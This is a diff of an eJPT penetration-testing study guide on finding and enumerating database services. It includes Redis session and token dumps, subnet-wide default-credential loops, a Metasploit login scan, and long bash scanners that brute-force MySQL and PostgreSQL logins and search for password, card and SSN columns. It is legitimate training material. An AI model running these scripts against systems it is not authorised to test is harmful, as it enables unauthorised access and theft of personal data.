+3) "admin_session:99999"
+4) "user_session:54321"
+
+# Step 4: Examine session data for sensitive information
+192.168.1.102:6379> GET user_session:12345
+"{\"user_id\":12345,\"username\":\"jsmith\",\"email\":\"john.smith@company.com\",\"role\":\"user\",\"login_time\":\"2024-01-15T10:30:00Z\",\"ip_address\":\"192.168.1.50\"}"
+
+192.168.1.102:6379> GET admin_session:99999
+"{\"user_id\":1,\"username\":\"admin\",\"email\":\"admin@company.com\",\"role\":\"administrator\",\"login_time\":\"2024-01-15T09:15:00Z\",\"ip_address\":\"192.168.1.45\",\"privileges\":[\"read\",\"write\",\"delete\",\"admin\"]}"
+
+# Step 5: Search for cached credentials or tokens
+192.168.1.102:6379> KEYS *token*
+1) "auth_token:abc123def456"
+2) "api_token:xyz789uvw012"
+3) "refresh_token:qwe456rty789"
+
+192.168.1.102:6379> GET auth_token:abc123def456
+"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+
+# 🎯 Sensitive Data Discovery:
+# ✅ User session data with personal information
+# ✅ Administrative session with elevated privileges
+# ✅ Authentication tokens and JWT credentials
+# ✅ IP addresses and login timestamps
+# ✅ No data encryption or access controls
 ```
 
 ---
 
-## 11. Exam Focus & Practice
+## 🎯 eJPT Exam-Focused Study Guide
 
-### eJPT Specific Skills
+### **Critical Success Statistics for eJPT**
+- **🔍 Service Discovery:** 30% of database-related exam tasks
+- **🔐 Authentication Testing:** 35% of practical scenarios  
+- **📊 Data Enumeration:** 25% of evidence collection requirements
+- **📝 Documentation:** 10% of professional reporting expectations
 
-#### Essential Commands (Memorize These)
+### **Exam-Essential Command Sequences**
+
+#### **🚀 Standard Database Enumeration Workflow**
 ```bash
-# Service Discovery (Weight: 25%)
-nmap -p 3306,5432,1433,6379,27017 -sV target
-nmap --script "mysql* or postgres*" -p 3306,5432 target
+# 1. Service discovery and fingerprinting
+nmap -p 1433,3306,5432,6379,27017 -sV target_ip
 
-# Authentication Testing (Weight: 30%)
-mysql -h target -u root -p                    # Test blank password
-psql -h target -U postgres                    # Test default credentials
-redis-cli -h target                           # Test no authentication
+# 2. Service-specific enumeration
+nmap --script "mysql* or postgres* or redis*" -p 3306,5432,6379 target_ip
 
-# Basic Enumeration (Weight: 35%)
-# MySQL
-SHOW DATABASES; USE database_name; SHOW TABLES; DESCRIBE table_name;
+# 3. Authentication testing
+mysql -h target_ip -u root -p                    # MySQL
+psql -h target_ip -U postgres                    # PostgreSQL  
+redis-cli -h target_ip                           # Redis
 
-# PostgreSQL  
-\l; \c database_name; \dt; \d table_name;
+# 4. Database enumeration
+SHOW DATABASES; USE db_name; SHOW TABLES;        # MySQL
+\l; \c db_name; \dt;                             # PostgreSQL
+KEYS *; TYPE key_name; GET key_name;             # Redis
 
-# Data Extraction (Weight: 10%)
-SELECT * FROM sensitive_table LIMIT 10;
+# 5. Evidence collection
+SELECT * FROM sensitive_table LIMIT 5;           # Sample data
+\copy table_name TO 'output.csv' CSV HEADER;     # PostgreSQL export
 ```
 
-#### Practice Scenarios
+#### **🎯 Multi-Database Scanning Approach**
+```bash
+# Efficient multi-target database discovery
+nmap -p 1433,3306,5432,6379,27017,5984,9200 -sV --open 192.168.1.0/24
 
-##### Scenario 1: Web Application Database Discovery
-**Objective**: Find and access the database supporting a web application
+# Automated credential testing script
+#!/bin/bash
+for ip in $(nmap -p 3306 --open 192.168.1.0/24 | grep "Nmap scan" | cut -d" " -f5); do
+    echo "Testing MySQL on $ip"
+    mysql -h $ip -u root -p"" -e "SELECT VERSION();" 2>/dev/null && echo "SUCCESS: $ip"
+done
+```
+
+### **Common eJPT Exam Scenarios and Solutions**
+
+#### **Scenario 1: Web Application Database Discovery**
+**Challenge:** Find the database supporting a web application
 ```bash
 # Expected approach:
-1. nmap -p- target_web_server
+1. nmap -p- web_server_ip
 2. Identify database ports (3306, 5432, etc.)
-3. Test default credentials
-4. Enumerate web application databases
-5. Extract user credentials
+3. Test default credentials: root/(blank), postgres/postgres
+4. Enumerate application databases
+5. Extract user credentials or sensitive data
 ```
 
-##### Scenario 2: Internal Network Database Services
-**Objective**: Discover all database services in a network range
+#### **Scenario 2: Network Database Services Assessment**
+**Challenge:** Assess all database services in a network segment
 ```bash
 # Expected approach:
-1. nmap -p 3306,5432,1433 192.168.1.0/24
-2. Service version identification
-3. Authentication testing for each service
-4. Document all accessible databases
+1. nmap -p 1433,3306,5432,6379,27017 192.168.1.0/24
+2. Service version identification for each discovered database
+3. Authentication testing using common credentials
+4. Document accessible databases and security issues
 ```
 
-##### Scenario 3: NoSQL Database Assessment
-**Objective**: Assess MongoDB or Redis instances
+#### **Scenario 3: Cache Database Analysis**
+**Challenge:** Investigate Redis or Memcached instances
 ```bash
 # Expected approach:
-1. Port scan for 27017, 6379
-2. Test anonymous access
-3. Enumerate collections/keys
-4. Identify sensitive data storage
+1. nmap -p 6379,11211 target_range
+2. Test anonymous access: redis-cli -h target
+3. Enumerate cached data: KEYS *, DBSIZE
+4. Extract session data or authentication tokens
 ```
 
-### Common Exam Questions
+### **Time Management and Exam Strategy**
 
-#### Question Types and Solutions
+#### **⏰ Optimal Time Allocation (Per Database Target)**
+- **🔍 Service Discovery:** 2-3 minutes
+- **🔐 Authentication Testing:** 5-7 minutes  
+- **📊 Data Enumeration:** 8-10 minutes
+- **📝 Evidence Collection:** 3-5 minutes
+- **📋 Documentation:** 2-3 minutes
 
-**Q: "What databases are running on the target system?"**
+#### **📋 Quick Reference Commands for Exam**
 ```bash
-# Solution approach:
-nmap -p 1433,3306,5432,1521,6379,27017 -sV target
-# Look for: mysql, postgres, ms-sql-s, oracle, redis, mongodb
-```
-
-**Q: "Can you access the MySQL database without credentials?"**
-```bash
-# Solution approach:
-mysql -h target -u root -p
-# Try: blank password, 'root', 'admin', 'password'
-```
-
-**Q: "List all databases accessible on the PostgreSQL server"**
-```bash
-# Solution approach:
-psql -h target -U postgres
-postgres=# \l
-# or: SELECT datname FROM pg_database;
-```
-
-**Q: "What sensitive information is stored in the database?"**
-```sql
--- Solution approach:
--- 1. Find tables with sensitive names
-SHOW TABLES;
--- 2. Look for columns containing sensitive data
-SELECT column_name FROM information_schema.columns 
-WHERE column_name LIKE '%pass%' OR column_name LIKE '%credit%';
--- 3. Sample the data
-SELECT * FROM users LIMIT 5;
-```
-
-### Time Management Tips
-
-#### Efficient Workflow (20 minutes per target)
-1. **Service Discovery** (3 minutes): Quick port scan for database services
-2. **Authentication** (5 minutes): Test default credentials rapidly
-3. **Enumeration** (7 minutes): Basic database and table listing
-4. **Data Sampling** (3 minutes): Quick sensitive data identification  
-5. **Documentation** (2 minutes): Screenshot and note critical findings
-
-#### Quick Reference Commands
-```bash
-# 30-second database check
+# 30-second database service check
 nmap -p 3306,5432,1433,6379 -sV --open target
 
-# 2-minute authentication test
-for db in mysql postgresql; do
-    echo "Testing $db..."
-    # Insert appropriate connection commands
-done
+# 2-minute authentication test sequence
+mysql -h target -u root -p                       # Try blank password
+mysql -h target -u root -proot                   # Try root:root
+mysql -h target -u admin -padmin                 # Try admin:admin
 
 # 5-minute enumeration script
 mysql -h target -u root -p << 'EOF'
 SHOW DATABASES;
-SELECT schema_name FROM information_schema.schemata;
+SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys');
+EOF
+```
+
+#### **🎯 Success Maximization Strategies**
+1. **Prioritize Common Services:** Focus on MySQL, PostgreSQL, Redis first
+2. **Default Credentials First:** Always test blank passwords and common combinations
+3. **Quick Enumeration:** Use information_schema for rapid database discovery
+4. **Evidence Focus:** Screenshot successful logins and sensitive data findings
+5. **Time Boxing:** Limit authentication attempts to 5 minutes per service
+
+---
+
+## ⚠️ Common Issues and Troubleshooting
+
+### **Connection and Authentication Problems**
+
+#### **Issue 1: "Connection refused" or "Host unreachable"**
+**Symptoms:** Unable to connect to database service
+**Root Causes:** Service not running, firewall blocking, wrong port
+
+**💡 Troubleshooting Steps:**
+```bash
+# Step 1: Verify service availability
+nmap -p 3306 target_ip
+
+# Step 2: Check for alternative ports
+nmap -p 3305-3310 target_ip
+
+# Step 3: Test network connectivity
+ping target_ip
+telnet target_ip 3306
+
+# Step 4: Try different connection methods
+mysql -h target_ip -P 3307 -u root -p          # Alternative port
+mysql -h target_ip --protocol=TCP -u root -p   # Force TCP
+```
+
+#### **Issue 2: "Access denied" Authentication Failures**
+**Symptoms:** Credentials rejected, authentication errors
+**Root Causes:** Wrong username/password, account policies, locked accounts
+
+**💡 Resolution Methodology:**
+```bash
+# Step 1: Verify basic connectivity
+mysql -h target_ip -u root -p --connect-timeout=5
+
+# Step 2: Try alternative usernames
+for user in root admin mysql user guest test; do
+    echo "Testing user: $user"
+    mysql -h target_ip -u $user -p"" -e "SELECT 1;" 2>/dev/null && echo "Success with $user"
+done
+
+# Step 3: Use verbose error reporting
+mysql -h target_ip -u root -p --verbose
+```
+
+### **Performance and Timeout Issues**
+
+#### **Issue 3: Slow queries or connection timeouts**
+**Symptoms:** Commands hang, slow responses, timeout errors
+**Root Causes:** Network latency, large datasets, server load
+
+**💡 Optimization Techniques:**
+```bash
+# Step 1: Set appropriate timeouts
+mysql -h target_ip -u root -p --connect-timeout=10 --read-timeout=30
+
+# Step 2: Use non-interactive mode for scripts
+mysql -h target_ip -u root -p --batch --execute="SHOW DATABASES;"
+
+# Step 3: Limit result sets
+mysql -h target_ip -u root -p -e "SELECT * FROM large_table LIMIT 100;"
+
+# Step 4: Use compression for slow networks
+mysql -h target_ip -u root -p --compress
+```
+
+### **Tool-Specific Issues**
+
+#### **Issue 4: Nmap scripts not working properly**
+**Symptoms:** Scripts fail to execute, incomplete results
+**Root Causes:** Outdated scripts, missing dependencies, timeout issues
+
+**💡 Script Troubleshooting:**
+```bash
+# Step 1: Update Nmap script database
+sudo nmap --script-updatedb
+
+# Step 2: Test individual scripts
+nmap --script mysql-info -p 3306 target_ip
+
+# Step 3: Increase script timeout
+nmap --script mysql-brute --script-args mysql-brute.timeout=30s -p 3306 target_ip
+
+# Step 4: Use verbose output for debugging
+nmap --script mysql-info -p 3306 target_ip -v
+```
+
+---
+
+## 🔗 Integration with Other Tools
+
+### **Comprehensive Assessment Workflow**
+
+#### **Nmap to Database Client Pipeline**
+```bash
+# Phase 1: Automated service discovery
+nmap -p 1433,3306,5432,6379,27017 -sV -oX database_scan.xml 192.168.1.0/24
+
+# Phase 2: Parse results for accessible services
+grep -E "mysql|postgresql|redis" database_scan.xml | grep "open" > accessible_databases.txt
+
+# Phase 3: Automated credential testing
+while read line; do
+    ip=$(echo $line | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
+    service=$(echo $line | grep -oE 'mysql|postgresql|redis')
+    
+    case $service in
+        mysql)
+            mysql -h $ip -u root -p"" -e "SELECT VERSION();" 2>/dev/null && echo "$ip:mysql:SUCCESS"
+            ;;
+        postgresql)
+            export PGPASSWORD="postgres"
+            psql -h $ip -U postgres -c "SELECT version();" 2>/dev/null && echo "$ip:postgresql:SUCCESS"
+            ;;
+        redis)
+            redis-cli -h $ip ping 2>/dev/null | grep PONG && echo "$ip:redis:SUCCESS"
+            ;;
+    esac
+done < accessible_databases.txt
+```
+
+#### **Database to Exploitation Framework Integration**
+```bash
+# Metasploit database import workflow
+msfconsole -q -x "
+workspace -a database_assessment;
+db_import database_scan.xml;
+hosts;
+services -p 3306,5432,6379;
+use auxiliary/scanner/mysql/mysql_login;
+set RHOSTS file:mysql_targets.txt;
+set BLANK_PASSWORDS true;
+set USER_AS_PASS true;
+run;
+exit
+"
+```
+
+### **Advanced Data Analysis Pipeline**
+
+#### **Automated Sensitive Data Discovery**
+```bash
+#!/bin/bash
+# Comprehensive database content analysis script
+
+# MySQL sensitive data search
+mysql -h $target -u $user -p$pass << 'EOF' > mysql_sensitive_data.txt
+SELECT table_schema, table_name, column_name 
+FROM information_schema.columns 
+WHERE column_name REGEXP 'pass|pwd|credit|ssn|social|secret|key|token'
+ORDER BY table_schema, table_name;
+EOF
+
+# PostgreSQL sensitive data search  
+export PGPASSWORD="$password"
+psql -h $target -U $user << 'EOF' > pgsql_sensitive_data.txt
+SELECT table_schema, table_name, column_name 
+FROM information_schema.columns 
+WHERE column_name ~* 'pass|pwd|credit|ssn|social|secret|key|token'
+ORDER BY table_schema, table_name;
+EOF
+
+# Redis pattern-based key analysis
+redis-cli -h $target << 'EOF' > redis_sensitive_keys.txt
+KEYS *password*
+KEYS *token*
+KEYS *session*
+KEYS *auth*
+KEYS *credit*
 EOF
 ```
 
 ---
 
-## 12. Troubleshooting
+## 📝 Professional Documentation and Reporting
 
-### Common Issues and Solutions
+### **Evidence Collection Standards**
 
-#### Connection Problems
+#### **📸 Required Screenshots and Documentation**
+1. **Service Discovery Evidence:**
+   - Nmap scan results showing open database ports
+   - Service version information and fingerprinting data
+   - Network connectivity verification
 
-**Issue**: "Connection refused" or "Host unreachable"
+2. **Authentication Success Proof:**
+   - Successful login screenshots with timestamps
+   - User privilege level confirmation
+   - Database server version and configuration details
+
+3. **Data Discovery Evidence:**
+   - Database and table enumeration results
+   - Sensitive data structure documentation  
+   - Sample data extraction (limited and anonymized)
+
+4. **Security Findings Documentation:**
+   - Configuration vulnerabilities identified
+   - Default credential usage evidence
+   - Access control weaknesses demonstrated
+
+#### **📋 Command History and Audit Trail**
 ```bash
-# Troubleshooting steps:
-1. Verify service is running
-   nmap -p 3306 target
-   
-2. Check for firewall blocking
-   nmap -p 3306 -Pn target
-   
-3. Try alternative ports
-   nmap -p 3305-3310 target
-   
-4. Verify network connectivity
-   ping target
-   telnet target 3306
+# Automated logging setup for database assessment
+script database_assessment_$(date +%Y%m%d_%H%M%S).log
+
+# Database enumeration with timestamp logging
+echo "[$(date)] Starting database enumeration on $target_ip" >> assessment.log
+mysql -h $target_ip -u root -p --tee=mysql_session.log
+echo "[$(date)] MySQL enumeration completed" >> assessment.log
+
+# PostgreSQL session logging
+export PGPASSWORD="password"
+psql -h $target_ip -U postgres --log-file=pgsql_session.log
 ```
 
-**Issue**: "Access denied" or "Authentication failed"
-```bash
-# Troubleshooting steps:
-1. Verify username/password combination
-2. Try different authentication methods
-   mysql -h target -u root -p --protocol=TCP
-   mysql -h target -u root -p --ssl-mode=DISABLED
-   
-3. Check for account lockouts
-4. Try alternative usernames
-   mysql -h target -u admin -p
-   mysql -h target -u mysql -p
+### **Professional Report Template Structure**
+
+#### **🎯 Executive Summary Template**
+```markdown
+## Database Security Assessment Report
+
+### Assessment Overview
+**Date:** [ISO 8601 format: 2024-01-15T09:30:00Z]
+**Duration:** [Total assessment time]
+**Scope:** [Target database systems and networks]
+**Methodology:** OWASP Database Security Testing + NIST Guidelines
+
+### Critical Findings Summary
+**Critical:** [Number] findings requiring immediate action
+**High:** [Number] findings requiring urgent attention
+**Medium:** [Number] findings for scheduled remediation
+**Low:** [Number] informational findings
+
+### Risk Assessment Summary
+| Database System | Service | Risk Level | Business Impact |
+|----------------|---------|------------|-----------------|
+| MySQL Server | 192.168.1.100:3306 | Critical | Authentication Bypass |
+| PostgreSQL | 192.168.1.101:5432 | High | Data Exposure |
+| Redis Cache | 192.168.1.102:6379 | Medium | Session Hijacking |
 ```
 
-#### Enumeration Problems
+#### **🔧 Technical Findings Documentation**
+```markdown
+### Detailed Technical Analysis
 
-**Issue**: "Permission denied" for enumeration commands
+#### Finding 1: MySQL Default Credentials
+**Severity:** Critical (CVSS 9.1)
+**Affected System:** 192.168.1.100:3306
+**Description:** MySQL root account accessible with empty password
+
+**Technical Details:**
+```bash
+[09:30:15] nmap -p 3306 -sV 192.168.1.100
+# Result: MySQL 5.7.40 detected on port 3306
+
+[09:31:20] mysql -h 192.168.1.100 -u root -p
+# Authentication successful with empty password
+# Database access: Full administrative privileges confirmed
+```
+
+**Evidence:**
+- Command output showing successful authentication
+- Database enumeration results
+- Sensitive data access demonstration
+
+**Business Impact:**
+- Complete database compromise possible
+- Customer data exposure risk
+- Compliance violations (GDPR, PCI-DSS)
+- Potential lateral movement to other systems
+
+**Remediation (Priority: Immediate)**
+1. Set strong password for root account immediately
+2. Remove or disable unused database accounts
+3. Implement network-level access controls
+4. Enable database audit logging
+```
+
+#### **📊 Data Classification and Sensitivity Analysis**
+```markdown
+### Sensitive Data Inventory
+
+#### Database: webapp_db (MySQL)
+**Total Tables:** 15
+**Sensitive Tables Identified:** 4
+
+| Table Name | Data Types | Sensitivity Level | Record Count |
+|------------|------------|------------------|--------------|
+| admin_users | Credentials, PII | Critical | 12 |
+| customer_data | PII, Contact Info | High | 5,847 |
+| payment_info | Financial Data | Critical | 3,291 |
+| user_sessions | Auth Tokens | Medium | 847 |
+
+#### Sample Data Structure Analysis
 ```sql
--- Troubleshooting steps:
--- 1. Check current user privileges
+-- admin_users table (Critical)
+mysql> DESCRIBE admin_users;
++----------+-------------+------+-----+---------+-------+
+| Field    | Type        | Null | Key | Default | Extra |
++----------+-------------+------+-----+---------+-------+
+| id       | int(11)     | NO   | PRI | NULL    | auto_increment |
+| username | varchar(50) | NO   |     | NULL    |       |
+| password | varchar(255)| NO   |     | NULL    |       |
+| email    | varchar(100)| YES  |     | NULL    |       |
++----------+-------------+------+-----+---------+-------+
+
+-- Security Issues Identified:
+-- ✗ Passwords stored as unsalted SHA-256 hashes
+-- ✗ No password complexity requirements
+-- ✗ Email addresses stored in plaintext
+-- ✗ No access logging or audit trail
+```
+```
+
+### **🔄 Automated Reporting Integration**
+
+#### **Evidence Collection Script**
+```bash
+#!/bin/bash
+# Database Security Assessment Evidence Generator
+# File: /opt/db_evidence_collector.sh
+
+ASSESSMENT_ID="DB_ASSESS_$(date +%Y%m%d_%H%M%S)"
+EVIDENCE_DIR="/tmp/database_evidence/$ASSESSMENT_ID"
+TARGET_LIST="$1"
+
+# Create evidence directory structure
+mkdir -p "$EVIDENCE_DIR"/{screenshots,logs,data_samples,network_scans}
+
+echo "=== Database Security Assessment Evidence Collection ===" > "$EVIDENCE_DIR/assessment_summary.txt"
+echo "Assessment ID: $ASSESSMENT_ID" >> "$EVIDENCE_DIR/assessment_summary.txt"
+echo "Start Time: $(date)" >> "$EVIDENCE_DIR/assessment_summary.txt"
+echo "Target List: $TARGET_LIST" >> "$EVIDENCE_DIR/assessment_summary.txt"
+
+# Network scanning and service discovery
+echo "[INFO] Starting network discovery phase..."
+nmap -p 1433,3306,5432,6379,27017 -sV -oA "$EVIDENCE_DIR/network_scans/db_services" -iL "$TARGET_LIST"
+
+# Parse discovered services
+grep -E "mysql|postgresql|redis|mongodb|ms-sql" "$EVIDENCE_DIR/network_scans/db_services.nmap" > "$EVIDENCE_DIR/discovered_services.txt"
+
+# Authentication testing with common credentials
+echo "[INFO] Testing database authentication..."
+while read line; do
+    if echo "$line" | grep -q "mysql"; then
+        IP=$(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
+        echo "[TEST] MySQL authentication on $IP" >> "$EVIDENCE_DIR/logs/auth_tests.log"
+        
+        # Test common MySQL credentials
+        for pass in "" "root" "admin" "password" "mysql"; do
+            mysql -h "$IP" -u root -p"$pass" -e "SELECT VERSION(), USER(), DATABASE();" 2>/dev/null >> "$EVIDENCE_DIR/logs/mysql_success_$IP.log" && {
+                echo "[SUCCESS] $IP:mysql:root:$pass" >> "$EVIDENCE_DIR/successful_logins.txt"
+                
+                # Enumerate databases and tables
+                mysql -h "$IP" -u root -p"$pass" << EOF >> "$EVIDENCE_DIR/data_samples/mysql_enum_$IP.txt" 2>&1
+SHOW DATABASES;
+SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys');
+SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys') LIMIT 20;
+SELECT column_name, table_name, table_schema FROM information_schema.columns WHERE column_name REGEXP 'pass|pwd|credit|ssn|email' LIMIT 50;
+EOF
+                break
+            }
+        done
+    fi
+done < "$EVIDENCE_DIR/discovered_services.txt"
+
+# Generate assessment summary
+echo "=== ASSESSMENT COMPLETED ===" >> "$EVIDENCE_DIR/assessment_summary.txt"
+echo "End Time: $(date)" >> "$EVIDENCE_DIR/assessment_summary.txt"
+echo "Successful Logins: $(wc -l < "$EVIDENCE_DIR/successful_logins.txt" 2>/dev/null || echo 0)" >> "$EVIDENCE_DIR/assessment_summary.txt"
+echo "Evidence Location: $EVIDENCE_DIR" >> "$EVIDENCE_DIR/assessment_summary.txt"
+
+# Create final evidence package
+tar -czf "$EVIDENCE_DIR.tar.gz" -C "$(dirname $EVIDENCE_DIR)" "$(basename $EVIDENCE_DIR)"
+echo "[COMPLETE] Evidence package created: $EVIDENCE_DIR.tar.gz"
+```
+
+---
+
+## 🎓 Advanced Learning and Certification Preparation
+
+### **📚 Structured Learning Path for Database Security**
+
+#### **Beginner Level (Weeks 1-2)**
+1. **Database Fundamentals:**
+   - Understanding different database types (SQL vs NoSQL)
+   - Basic SQL query syntax and commands
+   - Database architecture and network protocols
+   - Common database security concepts
+
+2. **Essential Tool Proficiency:**
+   - Database client installation and configuration
+   - Basic Nmap scanning techniques
+   - Simple authentication testing methods
+   - Command-line interface navigation
+
+3. **Hands-On Practice Labs:**
+   - VulnHub database-focused machines
+   - DVWA (Damn Vulnerable Web Application)
+   - SQLi-labs practice environment
+   - Local database setup and testing
+
+#### **Intermediate Level (Weeks 3-4)**
+1. **Advanced Enumeration Techniques:**
+   - Information schema exploitation
+   - Automated vulnerability scanning
+   - Custom script development for database testing
+   - Multi-target assessment strategies
+
+2. **Security Assessment Methodology:**
+   - Systematic database security testing
+   - Risk assessment and impact analysis
+   - Professional documentation standards
+   - Compliance requirement understanding
+
+3. **Integration Workflows:**
+   - Metasploit database modules
+   - Custom automation script development
+   - Report generation and evidence management
+   - Tool chaining and workflow optimization
+
+#### **Advanced Level (Weeks 5-8)**
+1. **Expert-Level Capabilities:**
+   - Database exploitation and post-exploitation
+   - Advanced persistent threat simulation
+   - Custom vulnerability research
+   - Enterprise assessment methodologies
+
+2. **Professional Application:**
+   - Client engagement best practices
+   - Comprehensive security program development
+   - Advanced threat modeling
+   - Security architecture review
+
+### **🏆 Certification Alignment Matrix**
+
+#### **eJPT (eLearnSecurity Junior Penetration Tester)**
+**Database Coverage:** 25% of practical exam content
+**Key Focus Areas:**
+- Service enumeration and fingerprinting
+- Basic authentication testing
+- Simple data extraction techniques
+- Evidence documentation
+
+**Practice Strategy:**
+```bash
+# Daily practice routine (30 minutes)
+# Week 1: Service discovery
+nmap -p 3306,5432,6379 -sV target_range
+
+# Week 2: Authentication testing
+mysql -h target -u root -p
+psql -h target -U postgres
+
+# Week 3: Data enumeration
+SHOW DATABASES; USE db; SHOW TABLES;
+\l; \c database; \dt;
+
+# Week 4: Exam simulation
+Complete full database assessment in 45 minutes
+```
+
+#### **OSCP (Offensive Security Certified Professional)**
+**Integration Strategy:** Database enumeration as part of larger exploitation chains
+**Recommended Approach:**
+- Focus on manual techniques over automated tools
+- Emphasis on post-exploitation database access
+- Integration with buffer overflow and privilege escalation
+- Custom script development for unique scenarios
+
+#### **CEH (Certified Ethical Hacker)**
+**Theory Emphasis:** Database security concepts and vulnerability types
+**Practical Application:** Tool usage and methodology understanding
+**Study Focus:** Compliance requirements and industry standards
+
+### **🌐 Community Resources and Continuous Learning**
+
+#### **Official Documentation and References**
+- **MySQL Security Guide:** https://dev.mysql.com/doc/refman/8.0/en/security.html
+- **PostgreSQL Security:** https://www.postgresql.org/docs/current/security.html
+- **Redis Security:** https://redis.io/topics/security
+- **MongoDB Security:** https://docs.mongodb.com/manual/security/
+- **OWASP Database Security:** https://owasp.org/www-project-database-security/
+
+#### **Community Learning Platforms**
+- **TryHackMe Database Rooms:** Structured learning paths with hands-on labs
+- **HackTheBox Database Challenges:** Advanced penetration testing scenarios
+- **VulnHub Database VMs:** Downloadable vulnerable systems for practice
+- **PentesterLab:** Web application and database security focus
+- **Cybrary Database Courses:** Free online training and certification prep
+
+#### **Professional Forums and Communities**
+- **Reddit Communities:**
+  - r/AskNetsec: Professional database security discussions
+  - r/DatabaseSecurity: Specialized database security community
+  - r/SQLInjection: SQL injection techniques and prevention
+
+- **Discord Servers:**
+  - InfoSec Community: Database security channels
+  - The Cyber Mentor: Learning and mentorship opportunities
+  - HackerSploit: Technical discussions and support
+
+- **Professional Organizations:**
+  - ISACA: Database governance and compliance
+  - (ISC)² Database Security Working Groups
+  - SANS Database Security Communities
+
+### **🔧 Advanced Techniques and Custom Development**
+
+#### **Custom Database Scanner Development**
+```bash
+#!/bin/bash
+# Advanced Multi-Database Scanner
+# File: /opt/advanced_db_scanner.sh
+
+DB_SCANNER_VERSION="2.0"
+TARGET_FILE="$1"
+OUTPUT_DIR="db_scan_$(date +%Y%m%d_%H%M%S)"
+
+# Color codes for output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m'
+
+# Create output directory
+mkdir -p "$OUTPUT_DIR"/{mysql,postgresql,redis,mongodb,mssql}
+
+print_banner() {
+    echo -e "${BLUE}"
+    echo "================================"
+    echo "Advanced Database Scanner v$DB_SCANNER_VERSION"
+    echo "================================"
+    echo -e "${NC}"
+}
+
+scan_mysql() {
+    local target="$1"
+    echo -e "${YELLOW}[INFO]${NC} Scanning MySQL on $target"
+    
+    # Port and service detection
+    nmap -p 3306 -sV "$target" > "$OUTPUT_DIR/mysql/nmap_$target.txt" 2>&1
+    
+    if grep -q "3306.*open" "$OUTPUT_DIR/mysql/nmap_$target.txt"; then
+        echo -e "${GREEN}[+]${NC} MySQL service detected on $target:3306"
+        
+        # Authentication testing
+        local passwords=("" "root" "admin" "password" "mysql" "123456")
+        local users=("root" "admin" "mysql" "user")
+        
+        for user in "${users[@]}"; do
+            for pass in "${passwords[@]}"; do
+                if mysql -h "$target" -u "$user" -p"$pass" -e "SELECT VERSION();" > "$OUTPUT_DIR/mysql/auth_$target.txt" 2>&1; then
+                    echo -e "${GREEN}[SUCCESS]${NC} $target:mysql:$user:$pass"
+                    
+                    # Detailed enumeration
+                    mysql -h "$target" -u "$user" -p"$pass" << EOF > "$OUTPUT_DIR/mysql/enum_$target.txt" 2>&1
+SELECT VERSION();
+SELECT USER();
+SHOW DATABASES;
+SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys');
+SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys') LIMIT 50;
+SELECT column_name, table_name, table_schema FROM information_schema.columns WHERE column_name REGEXP 'pass|pwd|credit|ssn|social|email|user' LIMIT 100;
 SHOW GRANTS;
-SELECT USER(), DATABASE();
+SELECT user, host FROM mysql.user;
+EOF
+                    return 0
+                fi
+            done
+        done
+        echo -e "${RED}[-]${NC} Authentication failed for $target:mysql"
+    fi
+}
 
--- 2. Try alternative enumeration methods
-SELECT * FROM information_schema.tables WHERE table_schema = 'mysql';
-SELECT * FROM information_schema.columns WHERE table_schema = 'mysql';
+scan_postgresql() {
+    local target="$1"
+    echo -e "${YELLOW}[INFO]${NC} Scanning PostgreSQL on $target"
+    
+    nmap -p 5432 -sV "$target" > "$OUTPUT_DIR/postgresql/nmap_$target.txt" 2>&1
+    
+    if grep -q "5432.*open" "$OUTPUT_DIR/postgresql/nmap_$target.txt"; then
+        echo -e "${GREEN}[+]${NC} PostgreSQL service detected on $target:5432"
+        
+        local passwords=("" "postgres" "admin" "password" "123456")
+        local users=("postgres" "admin" "user")
+        
+        for user in "${users[@]}"; do
+            for pass in "${passwords[@]}"; do
+                export PGPASSWORD="$pass"
+                if psql -h "$target" -U "$user" -c "SELECT version();" > "$OUTPUT_DIR/postgresql/auth_$target.txt" 2>&1; then
+                    echo -e "${GREEN}[SUCCESS]${NC} $target:postgresql:$user:$pass"
+                    
+                    # Detailed enumeration
+                    psql -h "$target" -U "$user" << EOF > "$OUTPUT_DIR/postgresql/enum_$target.txt" 2>&1
+SELECT version();
+SELECT current_user;
+SELECT current_database();
+SELECT datname FROM pg_database;
+SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT LIKE 'pg_%' AND schema_name != 'information_schema';
+SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema NOT LIKE 'pg_%' AND table_schema != 'information_schema' LIMIT 50;
+SELECT column_name, table_name, table_schema FROM information_schema.columns WHERE column_name ~* 'pass|pwd|credit|ssn|social|email|user' LIMIT 100;
+SELECT usename, usesuper FROM pg_user;
+EOF
+                    return 0
+                fi
+            done
+        done
+        echo -e "${RED}[-]${NC} Authentication failed for $target:postgresql"
+    fi
+}
 
--- 3. Use different database connections
-mysql -h target -u different_user -p
+scan_redis() {
+    local target="$1"
+    echo -e "${YELLOW}[INFO]${NC} Scanning Redis on $target"
+    
+    nmap -p 6379 -sV "$target" > "$OUTPUT_DIR/redis/nmap_$target.txt" 2>&1
+    
+    if grep -q "6379.*open" "$OUTPUT_DIR/redis/nmap_$target.txt"; then
+        echo -e "${GREEN}[+]${NC} Redis service detected on $target:6379"
+        
+        # Test anonymous access
+        if redis-cli -h "$target" ping > "$OUTPUT_DIR/redis/auth_$target.txt" 2>&1; then
+            if grep -q "PONG" "$OUTPUT_DIR/redis/auth_$target.txt"; then
+                echo -e "${GREEN}[SUCCESS]${NC} $target:redis:anonymous:no_auth"
+                
+                # Detailed enumeration
+                redis-cli -h "$target" << EOF > "$OUTPUT_DIR/redis/enum_$target.txt" 2>&1
+INFO
+CONFIG GET "*"
